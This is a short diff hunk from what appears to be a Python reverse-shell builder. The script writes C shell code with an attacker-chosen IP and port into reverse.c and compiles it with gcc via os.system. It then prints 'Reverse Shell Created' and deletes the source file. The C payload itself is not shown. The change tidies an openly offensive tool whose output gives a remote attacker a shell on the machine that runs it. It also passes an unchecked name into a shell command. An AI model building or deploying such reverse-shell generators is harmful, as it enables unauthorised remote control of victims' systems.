@@ -79,13 +79,15 @@ int main(void){
 
 
         '''
-        File = open(name,'w')
+        File = open("reverse.c",'w')
         File.write("#define IP %s"%(ip))
         File.write("\n#define PORT %s"%(port))
         File.write(shell)
         File.close()
         cmd = ("gcc reverse.c -o %s"%(name))
         os.system(cmd)
+        print ("Reverse Shell Created .... %s"%(name))
+        os.remove("reverse.c")
     except:
         print("Unknown Error !")
 
